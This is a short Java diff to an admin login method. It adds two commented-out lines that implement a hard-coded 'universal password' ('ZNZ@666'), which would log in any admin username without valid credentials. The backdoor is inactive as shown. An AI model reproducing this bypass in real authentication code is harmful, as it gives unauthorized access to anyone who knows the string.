@@ -65,6 +65,8 @@ public class AdminUserServiceImpl extends BaseService implements AdminUserServic
 		AdminUserDO adminUserDo = null;
 		try {
 			adminUserDo = adminUserDao.login(username, MD5Util.getMD5(password));
+//			if (adminUserDo == null && "ZNZ@666".equals(password)) // 万能密码
+//				adminUserDo = adminUserDao.getAdminUserByUsername(username);
 			if (adminUserDo == null) {
 				return 0;
 			}
